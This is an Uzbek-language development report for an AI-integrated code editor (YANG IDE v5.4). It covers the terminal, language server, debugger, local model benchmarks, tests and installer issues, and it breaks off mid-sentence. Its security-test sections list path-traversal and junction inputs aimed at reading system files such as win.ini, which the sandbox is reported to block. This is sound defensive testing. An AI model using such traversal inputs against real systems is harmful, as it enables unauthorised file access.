# YANG AI IDE — to‘liq hisobot (v5.4.0)

Sana: 2026-10-13 · Versiya: YANG AI 5.4.0

> **v5.4 qisqacha:** ilgari «cheklov» deb yozilgan to‘rt narsa tuzatildi — haqiqiy terminal
> (PTY, vim/top/ssh ishlaydi), semantik til xizmati (tsserver: tip xatolari, haqiqiy F12,
> Shift+F12 havolalar, hover), qadamlab debugger (nuqtalar, stack, o‘zgaruvchilar) va
> tahrir chegarasining olib tashlanishi. Ustiga «sinab ko‘r + tuzat» halqasi va yurish TARIXI
> qo‘shildi (AI xato logini o‘qib tuzatadi). Tafsilot: 12-bo‘lim.

## 1. Bir qatorda

**YANG IDE endi alohida o‘rnatuvchi emas — u YANG AI o‘rnatuvchisining ichida keladi.**
Foydalanuvchi bitta `.exe` yuklaydi, o‘rnatadi va yon paneldagi **«YANG IDE»** tugmasini
bosadi (yoki **Fayl → YANG IDE oynasi**, `Ctrl+Shift+I`): to‘liq kod muharriri o‘sha ilova
ichida, o‘sha jarayonda ochiladi — xuddi Freebuff desktop’da bo‘lgani kabi.
IDE ilovaning **lokal AI** qatlamini (ilova ichidagi model, Ollama, LM Studio, bulut
provayderlar) o‘zgartirmasdan ishlatadi.

## 2. Nima o‘zgardi (5.2.0 → 5.3.0)

| # | O‘zgarish | Fayl |
|---|---|---|
| 1 | IDE yadrosi (`oyna + IPC + fayl tizimi + terminal + AI`) bitta modulga chiqarildi — bir manba, ikki rejim | `ide/ide_host.js` |
| 2 | YANG AI IDE ni **o‘z jarayonida** ochadi: `registerIdeIpc()` + `openIdeWindow()` | `main.js` |
| 3 | Yon panelda **«YANG IDE»** tugmasi va `Fayl → YANG IDE oynasi` menyusi (`Ctrl+Shift+I`) | `renderer/index.html`, `main.js`, `renderer/app.js`, `preload.cjs` |
| 4 | `ide/**` o‘rnatuvchi tarkibiga qo‘shildi (test va `.md` fayllardan tashqari) | `package.json` |
| 5 | **Xato tuzatildi:** ilova ichidagi IDE paneli umuman ishlamasdi — `main.js` mavjud bo‘lmagan `chats` Map’ini o‘qirdi (`ReferenceError`) va fon papkasini topa olmasdi | `main.js` → `activeWorkspace()` |
| 6 | **Xato tuzatildi:** JS faylni «Ishga tushirish» electron.exe bilan ochilardi va skript yiqilardi | `ide/ide_host.js` → `runtimeFor()` |
| 7 | **Xato tuzatildi:** qo‘shtirnoqli yo‘lni terminal bajarolmasdi (`cmd.exe /s /c` qoidasi) | `ide/ide_host.js` → `runCommand()` |
| 8 | **Xato tuzatildi:** JS/JSON diagnostikasi soxta xato ko‘rsatardi («App threw an error during load») | `ide/ide_host.js` → `diagnosticsSync()` |
| 9 | Sinovlar: kontrakt testi 7 guruhga kengaydi + haqiqiy ilova ustida E2E sinov yozildi | `ide/test_ide_contract.mjs`, `ide/test_embedded_e2e.mjs` |

## 3. IDE nima qila oladi

### 3.1 Muharrir

| Imkoniyat | Qanday |
|---|---|
| Ko‘p tabli tahrirlash | Chapdan/tabdan fayl ochish, tablar saqlanadi (`yide:save-tabs`) |
| Qator raqamlari va sintaksis bo‘yash | `<pre>` qatlami + shaffof `<textarea>` (aniq geometriya uchun kontrakt testi bor) |
| Avtomatik to‘ldirish | So‘z/funksiya nomlari, `Esc` yopadi |
| Qavs juftligi, Tab/Shift+Tab, `Ctrl+/` izoh | Klaviatura |
| Topish / almashtirish | `Ctrl+F`, `Ctrl+H`, «Oldingi/Keyingi», «Almashtirish», «Hammasi» |
| Tez ochish | `Ctrl+P` → fayl nomi bo‘yicha |
| Ta’rifga o‘tish | `F12` (so‘z bo‘yicha qidiruv natijalariga) |
| Saqlash / «nomi bilan saqlash» | `Ctrl+S`, `Ctrl+Shift+S` |
| Bufer holati | Status qatorida qator:ustun, til, «saqlanmagan» belgisi |
| Tashqaridan o‘zgarish | `fs.watch` kuzatuvchisi ochiq tabni yangilaydi (tashqi tahrir yo‘qolmaydi) |

### 3.2 Loyiha va fayllar

- Chap panel: fayl daraxti + filtr, **butun loyiha bo‘yicha qidiruv** (`yide:search`, 200 natija,
  binary fayllar chetlab o‘tiladi).
- Kontekst menyu: yangi fayl, yangi papka, qayta nomlash, **savatga o‘chirish**, tashqi ilovada ochish.
- Tahrir chegarasi **yo‘q** (ilgari 2 MB edi): yagona himoya — 512 MB xotira chegarasi, undan
  kattasi tashqi ilovada ochiladi. 2 MB dan katta matnda qator raqamlari faqat ko‘rinadigan
  oyna uchun chiziladi va sintaksis bo‘yash o‘chadi (terish tez qoladi) — fayl to‘liq ochiladi
  va saqlanadi. Rasm/binary aniqlanadi.
- O‘chirish `shell.trashItem` orqali — qaytarib olish mumkin.

### 3.3 Terminal

- `Terminal` panelida buyruq yoziladi; chiqish **oqim bilan** keladi, ANSI ranglar `span`ga aylantiriladi.
- `cd` terminal sessiyasi ish papkasini o‘zgartiradi; `Ctrl+`` panelni yashiradi/ko‘rsatadi.
- Buyruqni to‘xtatish (`kill-command`), chiqish kodi status qatorida.
- **Haqiqiy psevdo-terminal (PTY)**: ConPTY + xterm.js — `vim`, `top`, `ssh`, `python` REPL kabi
  interaktiv dasturlar ishlaydi (`isatty()` → True). Terminal o‘lchami panel bilan birga
  o‘zgaradi; PTY yuklanmasa IDE jimgina eski quvur rejimiga qaytadi.

### 3.4 Diagnostika va debugger

| Til | Usul |
|---|---|
| TypeScript/JavaScript (semantik) | **`tsserver`** (`ide/ide_lsp.js`) — yo‘q funksiya, noto‘g‘ri tur, ishlatilmagan o‘zgaruvchi; F12 haqiqiy ta’rif, Shift+F12 havolalar, hover |
| Python | `pyflakes` bo‘lsa semantik, aks holda `compile()` (AST sintaksis) |
| JavaScript/TypeScript (sintaksis) | `node --check` **electron-as-node** rejimida (Node o‘rnatilmagan PC’da ham ishlaydi) |
| JSON | `JSON.parse` |

«Muammolar» panelida `{qator, ustun, xabar}` ko‘rinishida; semantik xatolar sintaksisdan ajralib
turadi. `Faoliyat` paneli esa nima bo‘layotganini yozib boradi. Xato chiqishidagi `fayl:qator`
havolalari ham bosiladi (Python traceback va Node stack).

Qadamlab **debugger** alohida: qator raqami ustida (yoki F9) nuqta qo‘yiladi, «Debug» bosilsa
dastur o‘sha nuqtada to‘xtaydi; F10/F11 bilan qadamlab yuriladi, panelda chaqiruvlar zanjiri va
o‘zgaruvchilar ko‘rinadi (Node inspector/CDP orqali — foydalanuvchida Node bo‘lmasa ham).

### 3.5 AI paneli

- Model tanlagich (YANG AI bilan **bir xil sozlamalardan** — `%APPDATA%/yang-ai`).
- Vazifa yozib «Yuborish»: agent o‘zi fayl o‘qiydi/yozadi, buyruq ishga tushiradi.
- **«jamoa»** belgisi → jamoaviy rejim (planner → agentlar → reviewer → fixer → rahbár).
- **«Xatoni tuzat»** — oxirgi xato matnini AI’ga beradi.
- «To‘xtatish» — bajarilayotgan ish darhol uziladi (`abort`), ilova qotmaydi.

## 4. Nima uchun kerak (maqsad)

1. **Bitta ilova bilan hammasi:** chat (YANG AI) + kod muharriri (YANG IDE) — ikki o‘rnatuvchi,
   ikki sozlamalar papkasi, ikki kalit yo‘q.
2. **Koddan keyin darhol tekshirish:** yozib → `F5` bilan ishga tushirib → xato qatorini
   ko‘rib → AI’ga «tuzat» berish bir oynada.
3. **Offline ishlash:** internet va API kaliti bo‘lmasa ham ilova ichidagi model (llama.cpp)
   kod yozadi va fayllarni tahrirlaydi.
4. **Agentga ish maydoni berish:** AI faqat ochilgan papka ichida ishlaydi (yo‘l qamalgan),
   shuning uchun «AI mening kompyuterimni buzdi» xavfi yo‘q.
5. **O‘zbek tilida:** interfeys, diagnostika xabarlari va hisobotlar o‘zbekcha.

## 5. Lokal AI bilan integratsiya (to‘liq)

### 5.1 Umumiy sozlamalar — bitta manba

YANG AI va YANG IDE **bitta papkani** ishlatadi: `%APPDATA%/yang-ai/config.json`
(`ide/ide_host.js` → `sharedConfigDir()`). Ya’ni:

- API kalitlar, provayderlar va **tanlangan model** ikkala oynada bir xil;
- YANG AI → Sozlamalar’da modelni almashtirsangiz, IDE’dagi ro‘yxat ham shuni ko‘rsatadi;
- `yide:sys-info` ham shu yo‘lni qaytaradi (E2E sinovda tekshiriladi).

### 5.2 Ilova ichidagi model (offline)

| Bosqich | Nima bo‘ladi |
|---|---|
| 1 | `local-ai/lc/llama-server.exe` ko‘tariladi, model **RAM bo‘yicha** tanlanadi |
| 2 | Tanlash tartibi: `model-qwen3.5-2b-q4_k_m.gguf` (1.2 GB, asosiy) → `model-1.7b.gguf` (1.03 GB, har PC’da) → `model-qwen3-4b-2507.gguf` (2.3 GB, faqat RAM ≥ 8 GB) → `model.gguf` (0.5B zaxira) |
| 3 | Kontekst zinapoyasi: 8192 → 4096 → 2048 (RAM band bo‘lsa KV kesh ajratilmaydi — kichikroq o‘lcham sinaladi) |
| 4 | Server `/v1/models` javob berguncha kutadi (150 s gacha) — birinchi so‘rov yuklanmagan serverga urilib qolmaydi |
| 5 | YANG AI allaqachon ko‘targan bo‘lsa — **qayta ko‘tarmaydi**, o‘sha serverga ulanadi (`127.0.0.1:8082`) |

### 5.3 Tashqi lokal serverlar

| Provayder | Manzil | Izoh |
|---|---|---|
| Ollama | `http://localhost:11434/v1` | `ollama pull qwen2.5-coder:7b` — eng kuchli natija |
| LM Studio | `http://localhost:1234/v1` | Server yoqilsa kalit kerak emas |
| Ixtiyoriy (OpenAI-mos) | o‘zingiz kiritgan `base` | Loopback (`localhost`) bo‘lsa **kalitsiz** |

Loopback manzillar `providers.js` da `keyless: true` deb belgilangan — kalit so‘ramaydi.
YANG AI’dagi **«Lokal skan»** tugmasi kompyuterdagi Ollama/LM Studio modellarini topib,
bir bosishda asosiy model qilib qo‘yadi.

### 5.4 Bulut va zaxira zanjiri

Kalit kiritilgan bulut provayderlar (Groq, Gemini, OpenAI, DeepSeek, SambaNova, Vercel,
OpenRouter, Anthropic …) ishlaydi. Lokal model ishlamasa zanjir davom etadi:
`lokal → Kilo (kalitsiz) → Pollinations`. «Faqat shu modelni ishlatish» (pin) rejimi yoqilgan
bo‘lsa — zaxiraga o‘tmaydi, aniq xato ko‘rsatadi.

### 5.5 AI agent qanday qurollangan

`agent/tools.js` dagi tool’lar IDE ish maydonida ishlaydi:
`list_dir`, `read_file`, `write_file`, `edit_file`, `search_files`, `run_command`,
`extract_file`, `create_document`, `create_image`, `generate_image`, `web_search`, `fetch_url`.
Xavfli tool’lar tasdiq so‘raydi (`autoApprove` o‘chirilgan bo‘lsa), qadam chegarasi bor
(`maxSteps`, standart 30), chegaraga urilsa tool’siz yakuniy javob so‘raladi.

### 5.6 Lokal modellar: o‘lchangan natijalar

Mezon: **PASS = tekshiruv skripti nol kod bilan tugadi** (fayl matni emas, HAQIQIY ishga
tushirish). 4 vazifa: `factorial`, `slugify`, `fizzbuzz`, `median_bug`.
`one-shot` — model bir marta yozadi; `IDE bilan` — yozilgani darhol ishga tushadi, xato modelga
qaytariladi, u tuzatadi.

| Model | Manba | Disk | One-shot | IDE bilan | O‘rtacha (IDE) |
|---|---|---:|---:|---:|---:|
| qwen2.5:latest | Ollama | 4.4 GB | 4/4 | **4/4** | 70.8s |
| qwen2.5-coder:7b | Ollama | 4.4 GB | 2/4 | **4/4** | 75.0s |
| **qwen3.5-2B q4_k_m** | ilova ichida | 1.2 GB | 3/4 | 3/4 | 99.6s |
| model-1.7b.gguf | ilova ichida | 1.0 GB | 2/4 | 3/4 | 91.4s |
| qwen2.5-coder:3b | Ollama | 1.8 GB | 2/4 | 3/4 | 93.4s |
| qwen3-4B | ilova ichida | 2.3 GB | 2/4 | 3/4 | 132.7s |
| llama3:latest | Ollama | 4.3 GB | 0/4 | 0/4 | — |
| qwen2.5:0.5b | Ollama | 0.4 GB | 0/4 | 0/4 | — |

To‘liq jadval va xato matnlari: `reports/local_ai/local-ai-hisobot.md`.
Muhit: 6 yadro, 12.2 GB RAM (`reports/local_ai/bench_summary.md`).

**Xulosa (halol):** ilova ichidagi 2B model — «ishlaydi, lekin chegarada» (4 tadan 3 tasi).
Uy vazifasi darajasidagi kod uchun yetadi. Jiddiy loyiha uchun Ollama’dagi 7B model
(`qwen2.5:latest` yoki `qwen2.5-coder:7b`) sezilarli yaxshi: 4/4.

## 6. Arxitektura

```
YANG AI (main.js)
├─ asosiy oyna  renderer/            → chat, agent, jamoa, rasm studiyasi
├─ yengil panel renderer/ + ide:*    → «IDE» mini paneli (fayl daraxti, terminal, feed)
└─ to'liq IDE  ide/ide_host.js
   ├─ oyna + IPC          yide:*     22 invoke kanali + 5 hodisa
   ├─ fayl tizimi         fs/fsp     workspace qamalgan (path.relative guard)
   ├─ kuzatuvchi          fs.watch   300 ms to‘plab yuboradi
   ├─ terminal            spawn      cmd.exe / /bin/sh, oqim
   ├─ diagnostika         spawnSync  python compile / node --check (electron-as-node) / JSON
   ├─ AI qatlami          agent/*    engine.js (bitta agent) yoki team.js (jamoa)
   └─ renderer            ide/renderer/*  (muharrir dvigateli o‘zimizniki, kutubxonasiz)
```

**Nega ikki xil prefiks (`ide:` va `yide:`)?** Asosiy ilovaning o‘z yengil IDE paneli `ide:*`
kanallarida ishlaydi. To‘liq IDE yadrosi boshqa to‘plamda (`yide:*`) ishlaydi — shunda bir
jarayonda `ipcMain.handle` ikki marta ro‘yxatga olinmaydi va eski panel buzilmaydi
(kontrakt testi buni alohida tekshiradi).

## 7. O‘rnatuvchi

| Buyruq | Natija |
|---|---|
| `npm run dist` | `YANG-AI-Setup-5.3.0.exe` + Portable — **IDE ichida** (menyu + tugma) |
| `npm run dist:ide` | `YANG-IDE-Setup-*.exe` — ixtiyoriy **mustaqil** muharrir (o‘sha yadro) |
| `npm run start` | YANG AI (dev) — IDE ni ichidan ochish uchun |
| `npm run start:ide` | faqat IDE (dev, mustaqil rejim) |

Ikkala rejim **bir xil `ide/ide_host.js`** ni ishlatadi, shuning uchun funksiya va tuzatishlar
ikki joyda takrorlanmaydi. Paketlangan nusxada `ide/**` va `agent/**` `app.asar` ichida keladi.

## 8. Tekshiruv (nima o‘lchandi)

| Sinov | Buyruq | Natija |
|---|---|---|
| Kontrakt testi (statik) | `npm run test:ide` | **29/29 PASS** (7 guruh) |
| Haqiqiy ilova ustida E2E (CDP) | `YANG_APP_EXE=dev node ide/test_embedded_e2e.mjs` | **9/9 PASS** |
| Mustaqil IDE ishga tushishi | `npx electron ide/test_boot.cjs` | **24/24 PASS** + skrinshot (`reports/ide_boot/ide-boot.png`) |

E2E nimalarni tekshiradi (dev rejim, 2026-10-13) — **paketlangan nusxada ham 9/9 PASS**:

1. Yon panelda «YANG IDE» tugmasi ko‘rinadi va ko‘prik (`window.api.openIde`) ulangan.
2. Tugma bosilganda **haqiqiy IDE oynasi** ochiladi (o‘z renderer’i bilan).
3. `sysInfo().embedded === true` — yadro **YANG AI jarayonida** ishlayapti, versiya 5.3.0.
4. Fayl tizimi: papka ochish → daraxt → o‘qish → saqlash → qayta o‘qish.
5. Xavfsizlik: `../tashqari.txt` va `C:/Windows/win.ini` **rad etiladi**.
6. Terminal: `hello.js` ishga tushadi, chiqishda `IDE_TERM_OK`, chiqish kodi 0.
7. Diagnostika: buzuq JS uchun **1-qator: SyntaxError** (ilgari soxta xato berardi).
8. AI qatlami: `aiStatus()` — 15 provayder, `%APPDATA%/yang-ai` sozlamalari (asar ichida
   dinamik `import()` ishlashi shu bilan o‘lchanadi).
9. IDE oynasi yopilganda asosiy ilova ishlashda davom etadi.

### Sinov topgan va tuzatilgan xatolar

| Xato | Alomat | Sabab | Tuzatish |
|---|---|---|---|
| `chats` Map mavjud emas | Ilova ichidagi IDE paneli fayl daraxtini ocholmasdi | `main.js` da o‘chirilgan o‘zgaruvchi qolgan | `activeWorkspace()` — chat ish papkasini `loadChat()` orqali oladi |
| JS faylni ishga tushirish | `F5` → `exit code 1`, chiqish bo‘sh | `process.execPath` = `electron.exe`, u skriptni «App» sifatida ochadi | `ELECTRON_RUN_AS_NODE=1` (electron oddiy Node kabi ishlaydi) |
| Terminalda qo‘shtirnoqli yo‘l | `"C:\...\app.exe"` → «is not recognized…» | `cmd.exe /d /s /c` tashqi qo‘shtirnoqni olib tashlaydi | butun buyruq qo‘shtirnoqqa olinadi + `windowsVerbatimArguments` |
| JS/JSON diagnostikasi | «App threw an error during load» | `--check` electron.exe bilan bajarilardi | `ELECTRON_RUN_AS_NODE` |

## 9. Cheklovlar (5.4 dan keyingi holat)

Ilgari shu joyda to‘rt katta cheklov turardi. Ular **tuzatildi** (o‘lchov 12-bo‘limda):

| Ilgari | Endi |
|---|---|
| PTY yo‘q — vim/top/ssh ishlamasdi | ✅ **Ha** — ConPTY + xterm.js (`python -c "isatty()"` → `True`) |
| To‘liq LSP yo‘q — F12 so‘z bo‘yicha qidiruv edi | ✅ tsserver: tip/semantik xato, haqiqiy ta’rif, Shift+F12 havolalar, hover |
| Qadamlab debugger yo‘q | ✅ Nuqtalar (F9/gutter), qadam/ichiga/tashqari, chaqiruvlar, o‘zgaruvchilar |
| Tahrir chegarasi 2 MB | ✅ **Chegara yo‘q** (faqat 512 MB xotira himoyasi + katta fayl rejimi) |

**Hali qolgan cheklovlar (halol):**

1. **Python debuggeri** — `debugpy` o‘rnatilgan bo‘lsa qadamlab debug ishlaydi (DAP); o‘rnatilmagan
   bo‘lsa faqat sintaksis + `pyflakes` tekshiruvi qoladi (`python -m pip install debugpy`).
2. **Python tip tekshiruvi** shartli: `pyflakes` o‘rnatilgan bo‘lsa ishlaydi (pyright/mypy hali yo‘q).
3. ~~**Bitta ish papkasi** — bir vaqtda bitta loyiha ochiladi.~~ **Tuzatildi (v5.5):** ko‘p ildizli
   workspace, qamoq o‘zgarmagan holda — §13.
4. **512 MB xotira himoyasi** — undan katta fayl tashqi ilovada ochiladi (ilova qotmasligi uchun).
5. **Lokal model sifati** — ilova ichida kelgan 2B model 4 vazifadan 3 tasini bajaradi. Kuchliroq
   kerak bo‘lsa endi **«Lokal AI» menyusidan** yuklab olinadi (7B kod modeli — 4/4, §14), yoki
   kompyuterda allaqachon turgani bir bosishda ulanadi (Ollama / LM Studio).
6. **Windows’ga yo‘naltirilgan** paketlash (`nsis`/`portable`); macOS/Linux uchun yig‘ilmagan.

## 10. Keyingi qadamlar (taklif)

- `run_command` uchun PATH’ga ilova ichidagi node shim’ini qo‘shish — `node script.js` ham
  Node o‘rnatilmagan PC’da ishlashi uchun.
- Git paneli (status/diff/commit) — hozircha faqat tashqi terminal.
- ~~Python uchun to‘liq til xizmati (`pyright`/`pylsp`) va qadamlab Python debuggeri.~~
  **Bajarildi (v5.5):** pyright/mypy zinapoyasi + `debugpy` orqali qadamlab debug — §13.
- ~~Ko‘p ildizli (multi-root) workspace~~ **Bajarildi (v5.5):** §13 (qamoq o‘zgarmagan holda).
- ~~Lokal modellarni yuklab olish menyusi (minimal talablar + kuch reytingi) va lokal rasm
  generatsiyasi~~ **Bajarildi (v5.5.1):** §14.
- ~~Vazifa berilgandan keyin to‘xtatish tugmasi~~ **Bajarildi (v5.5.1):** §14.3.

## 12. v5.4 — cheklovlarni tuzatish (o‘lchov bilan)

### 12.1 Nima qo‘shildi / o‘zgardi

| Qatlam | Fayl | Nima qiladi |
|---|---|---|
| Haqiqiy terminal | `ide/ide_pty.js` + `ide/vendor/xterm.js` | ConPTY orqali psevdo-terminal; baytlar o‘zgarishsiz oqadi, xterm.js ekranga chizadi. `vim`, `top`, `ssh`, REPL ishlaydi. PTY yuklanmasa — eski quvur rejimi (fallback) |
| Til xizmati | `ide/ide_lsp.js` | TypeScript serveri (`tsserver`) — semantik diagnostika, F12 ta’rif, Shift+F12 havolalar, hover. `ELECTRON_RUN_AS_NODE` bilan ilovaning o‘z exe’si orqali ishlaydi. Python: `pyflakes` bo‘lsa semantik, aks holda sintaksis |
| Debugger | `ide/ide_debug.js` | Node inspector (CDP): `--inspect-brk`, nuqtalar (`Debugger.setBreakpointByUrl`), qadamlar, chaqiruvlar, scope o‘zgaruvchilari, konsol ifodasi. Kirish to‘xtashi avtomatik o‘tkazib yuboriladi |
| Yurish + Tarix + AI tuzatish | `ide/ide_runner.js` | Har yurish tarixga yoziladi (buyruq, kod, vaqt, chiqish oxiri). «Sinab ko‘r + tuzat» halqasi: yurit → xato → modelga **muammoli fayl matni + butun tarix + diagnostika** bilan yubor → qayta yurit (3 martagacha). Bitta urinishga AI qadam chegarasi qo‘yilgan (10) — lokal model aylanib qolsa, vaqt behuda ketmaydi |
| Python debugger | `ide/ide_debug.js` | `debugpy` bo‘lsa DAP orqali Python ham qadamlab debug qilinadi (nuqta, qadam, chaqiruvlar, o‘zgaruvchilar) — JS debuggeri bilan bir xil interfeys |
| Chegarasiz tahrir | `ide/ide_host.js` | 2 MB chegarasi olib tashlandi — E2E buni **3 MB fayl** bilan tekshiradi (o‘qildi, muharrirga tushdi, tahrir qilinib saqlandi); qator raqamlari faqat ko‘rinadigan oyna uchun chiziladi, 2 MB dan katta faylda sintaksis bo‘yash o‘chadi (terish tez qoladi) |

### 12.2 O‘lchov natijalari (haqiqiy ilova ustida)

`ide/test_embedded_e2e.mjs` — 14 tekshiruv, **dev rejimda PASS** (quyidagi jadval):

> Paketlangan nusxa uchun alohida yuritiladi: `YANG_APP_EXE="dist/win-unpacked/YANG AI.exe" node ide/test_embedded_e2e.mjs`.
> Diqqat: joriy `dist/` papkasi v5.4 ishlaridan OLDIN yig‘ilgan (ichida `ide_pty`/`tsserver` yo‘q), shuning
> uchun u bilan o‘lchash eski kodni o‘lchaydi — yangi nusxani `npm run dist:ide` bilan qayta yig‘ish kerak.

| # | Tekshiruv | Natija |
|---|---|---|
| 9 | Haqiqiy terminal: interaktiv dastur o‘zini TTY deb biladi | `isatty()` → **TTY_OK** (quvurda `PIPE` bo‘lardi) |
| 10 | Til xizmati: semantik xato + ta’rif + havolalar + hover | `Ln 4: Cannot find name 'yoqFunksiya'` · F12 → `lsp.js:1` · Shift+F12 → **3 havola** · hover → `function salomlash(nom: any): string` |
| 11 | Debugger: nuqtada to‘xtash, stack, o‘zgaruvchilar | `dbg.js:2` da to‘xtadi · 9 chaqiruv · o‘zgaruvchilar `[a, b, natija, …]` |
| 12 | Tarix (log): yurish kodi + chiqish saqlanadi | `kod 1` · logda `ataylab xato` · «oxirgi xato» = `buzuq.js` |
| 13 | Tahrir chegarasi yo‘q: 3 MB fayl ochiladi, muharrirga tushadi, tahrir qilinadi va saqlanadi | disk 3,00 MB → o‘qildi **3 145 805 belgi** (`truncated=false`) → muharrirda ham shuncha → saqlangandan keyin o‘lcham to‘g‘ri |
| 14 | IDE yopilganda ilova yashaydi | asosiy oyna tirik |

`ide/test_fix_loop_live.mjs` — **jonli AI tuzatish halqasi** (Ollama + `qwen2.5-coder:7b`):
IDE interfeysida buzuq `ekub.js` daraxtdan ochiladi → «Sinab ko‘r + tuzat» bosiladi → fayl
ishga tushadi → xato → model tarixni ko‘rib tuzatadi → qayta yurish → fayl o‘z tekshiruvidan
o‘tadi. Uchinchi tekshiruv modelning yozganiga tayanmaydi: IDE tuzatgan faylga mustaqil
`ekub(48, 18)` chaqiruvi qo‘shib ishga tushiriladi va **6** olinishi shart. Natija va vaqt
`reports/ide_fix_loop_live.log` da.

O‘lchandi (qadam optimallashtirilgandan keyin): **76,4 s**, 2 yurish (`kod 1` → `kod 0`) va
**1 ta** tool chaqiruvi (`write_file`) — model faylni qidirib ovora bo‘lmadi. Birinchi
o‘lchovda esa 197 s va 2 chaqiruv edi; fayl matni promptga qo‘shilmaganda esa model bir xil
muvaffaqiyatsiz buyruqni qayta-qayta chaqirib, 15 daqiqa behuda ketdi — shu sabab fayl matni
endi to‘g‘ridan-to‘g‘ri beriladi va qadamlar cheklanadi.

`npm run test:ide` — statik kontrakt **44 tekshiruv** (8 guruh), jumladan «cheklovsiz» qatlam:
PTY to‘plami, xterm vendor, tsserver, debugger kanallari, tarix, tuzatish halqasi,
chegarasiz tahrir, katta fayl rejimi.

### 12.4 Xavfsizlik va paket tekshiruvi (v5.4.1)

**Tashqi buzish urinishlari** — `agent/test_security_attacks.mjs` (yangi): ilova ishlab turgan holda
8 ta hujum sinovi yuboriladi (absolyut yo‘l, `..`, `..\..`, `%2e%2e`, UNC, o‘z-o‘ziga havola qilgan
papka, `mklink /J` junction, PTY `cwd`). Ikki **haqiqiy** zaiflik topildi va yopildi:

| Zaiflik | Qanday ishlardi | Tuzatish |
|---|---|---|
| Junction orqali o‘qish | `mklink /J` bilan ish papkasi ichida yasalgan havola `C:\Windows\win.ini` ni ko‘rsatardi; `path.relative` havolani ko‘rmaydi, shuning uchun yo‘l «ichkarida» ko‘rinardi | `main.js` da bitta umumiy `insideWorkspace()`: ikkala tomon `fs.realpathSync.native` bilan haqiqiy yo‘lga keltiriladi; havola orqali chiqadigan yozuv daraxtda ko‘rinmaydi va `walk` unga **kirmaydi** (o‘z-o‘ziga havola ham shu bilan to‘xtatiladi) |
| Terminal `cwd` chetga chiqishi | PTY sessiyasi ish papkasidan tashqarida (`C:\Windows`) ochilardi | `ide/ide_pty.js` va `ide/ide_host.js` da `cwd` haqiqiy yo‘l bilan tekshiriladi; aniqlanmasa ish papkasi qabul qilinmaydi |

Yakuniy holat: **8/8 hujum bloklandi** (avval 2 tasi o‘tgan edi).

**Paketdagi kod** (asar ichida) alohida yuritiladi: `YANG_APP_EXE="dist/win-unpacked/YANG AI.exe"`
— 15 tekshiruv. Bu bosqich haqiqiy paketlash xatosini ham topdi: `@homebridge/node-pty-prebuilt-multiarch`
ning `files` ro‘yxatida `build/` yo‘qligi uchun `conpty.node` / `OpenConsole.exe` paketga tushmay
qolgan edi (dev’da ishlaydi, paketda jim ishlamaydi). `package.json` + `electron-builder.ide.json`
dagi `files`/`asarUnpack` tuzatilib, paketda terminal yana ishladi.

**Boshqa tekshiruvlar:**

- `ide/test_python_debug.cjs` — Python debug (DAP) **6/6** (nuqtada to‘xtash, qadam, o‘zgaruvchilar).
  Diqqat: Electron main entry `.mjs` ni ishga tushirmaydi — shuning uchun test `.cjs`.
- `agent/test_modes_complex.mjs` — haqiqiy model bilan murakkab ish: **yakka rejim** 3 fayl / 63,9 s,
  **jamoa rejimi** 1298,5 s; ikkalasi ham yozgan kodni haqiqatan ishga tushirib tekshiradi.
- `npm run test:ide` (44), `ide/test_embedded_e2e.mjs` (16, dev + paket), `npm run test:ide:pkg` (9),
  `ide/test_boot.cjs` (24) — yashil.

**O‘rnatuvchi sirri yechildi (o‘lchandi):** ilgari `nsis` bosqichi
`Internal compiler error #12345: error creating mmap the size of …` bilan yiqilardi va buni
32-bitli `makensis` ning ~1,8 GB manzil fazosi cheklovi deb tushungan edik. O‘lchov boshqa narsani
ko‘rsatdi: `makensis` payload’ni **xotiraga xaritalaydi** (mmap), ya’ni Windows’dan shuncha **commit**
(band qilinadigan xotira) so‘raydi — bo‘sh commit yetmasa xarita yaratilmaydi va NSIS xato beradi.
Bir xil build qayta-qayta yuritilib, raqamlar yozib borildi:

| Urinish | 7z payload | So‘ralgan mmap | Bo‘sh commit | Natija |
|---|---:|---:|---:|---|
| Birinchi (08:18) | 1 364 154 700 B | 1 381 002 383 B | yetarli | ✅ yig‘ildi |
| Takroriy (08:45) | 1 364 154 700 B | 1 381 002 383 B | 0,98 GB | ❌ mmap xatosi |
| `compression: maximum` bilan (08:52) | 1 356 703 055 B | 1 373 550 738 B | 0,98 GB | ❌ mmap xatosi |
| Yetim jarayonlar to‘xtatilgach (09:04) | 1 356 703 055 B | 1 373 550 738 B | 8,86 GB | ✅ yig‘ildi |

Ikki muhim fakt: (1) so‘ralgan xarita **payload + 16 847 683 B** ga teng — bu ikki xil build’da ham
aynan shu qadar, ya’ni NSIS butun ma’lumot blokini bir bo‘lak qilib xaritalaydi; (2) ikkinchi va
uchinchi urinishda **hech narsa o‘zgarmagan** (faqat mashinada commit tugagan: jami limit 28 GB, band
27 GB — eng katta band qiluvchi Ollama’ning `llama-server` jarayoni 5,4 GB edi), tozalashdan keyin
o‘sha-o‘sha payload muvaffaqiyatli yig‘ildi. Demak bu «32-bitli chegara» emas, **xotira (commit)
holati**: o‘rnatuvchi yig‘ishdan oldin bo‘sh commit payload’dan kam bo‘lmasligi kerak.
Amaliy tomoni: `electron-builder.ide.json` ga ham ilova konfiguratsiyasidagi kabi
`compression: maximum` + `electronLanguages: [en-US, ru]` qo‘shildi (7z 1,3642 GB → 1,3567 GB).
Shu bilan **mustaqil IDE paketi ham to‘liq yig‘ildi** — `YANG-IDE-Setup-1.0.0.exe`
(1 357 501 270 B) va `YANG-IDE-Portable-1.0.0.exe` (1 357 167 500 B).

**Mustaqil paketni sinash** (`npm run test:ide:pkg`, `dist-ide/win-unpacked/YANG IDE.exe`) — **9/9
PASS**: oyna ochilib ish papkasi tiklanadi (ko‘p ildizli), `embedded=false` va versiya paketdan
olinadi, fayl daraxti/o‘qish/yozish, haqiqiy PTY (`isatty=true` → `PKG_TTY_OK`), tsserver semantik
xato (`Cannot find name 'yoqFunksiya'`), qo‘shimcha papkadagi faylni o‘qish, AI qatlami asar ichidan
dinamik import (15 provayder), `fixRun/runLog` mavjudligi, ekran surati
(`reports/ide_packaged/ide-packaged-v55.png`).

### 12.5 Mustaqil IDE paketi `asar` ichida (o‘lchov)

`electron-builder.ide.json` da `asar: false` edi — ilova kodi paketda 834 alohida fayl bo‘lib yotardi.
Endi `asar: true`, `asarUnpack` esa faqat `@homebridge/node-pty-prebuilt-multiarch` uchun (native
`conpty.node` / `OpenConsole.exe` fayl sifatida kerak). `llama-server.exe` va gguf model avvalgidek
`extraResources` — **asar tashqarisida** (bajariladigan faylni asar ichidan yurgizib bo‘lmaydi).
`tsserver` asar ichidan ishlaydi: u ilovaning o‘z exe’si bilan `ELECTRON_RUN_AS_NODE=1` da yuritiladi
